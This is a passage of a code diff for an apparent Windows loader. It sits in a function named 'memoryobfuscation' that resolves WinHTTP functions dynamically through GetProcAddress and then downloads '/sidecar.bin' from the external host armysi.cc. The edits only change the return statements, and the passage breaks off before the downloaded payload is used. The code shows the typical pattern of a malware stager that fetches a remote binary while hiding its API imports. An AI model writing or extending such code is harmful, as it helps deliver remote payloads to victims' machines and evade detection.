@@ -149,7 +149,7 @@ void memoryobfuscation(){
     typedef BOOL      (WINAPI *WinHttpCloseHandle_t)(HINTERNET);
 
     HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
-    if (!hWinHttp) return 1;
+    if (!hWinHttp) return;
      
     WinHttpOpen_t WinHttpOpen = (WinHttpOpen_t)GetProcAddress(hWinHttp, "WinHttpOpen");
     WinHttpConnect_t WinHttpConnect = (WinHttpConnect_t)GetProcAddress(hWinHttp, "WinHttpConnect");
@@ -160,19 +160,19 @@ void memoryobfuscation(){
     WinHttpCloseHandle_t WinHttpCloseHandle = (WinHttpCloseHandle_t)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
     
     if (!WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpReadData || !WinHttpCloseHandle)
-        return 2;
+        return;
     
     HINTERNET hSession = WinHttpOpen(L"MyAgent", 1, NULL, NULL, 0); // INTERNET_OPEN_TYPE_PRECONFIG = 1
-    if (!hSession) return 3;
+    if (!hSession) return;
             
     HINTERNET hConnect = WinHttpConnect(hSession, L"armysi.cc", 80, 0); // 443 for HTTPS
-    if (!hConnect) return 4;
+    if (!hConnect) return;
      
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/sidecar.bin", NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
-    if (!hRequest) return 5;
+    if (!hRequest) return;
     
-    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return 6;
-    if (!WinHttpReceiveResponse(hRequest, NULL)) return 7;
+    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return;
+    if (!WinHttpReceiveResponse(hRequest, NULL)) return;
         
     DWORD size = 0;
     DWORD sidecar_bin_len = 0;
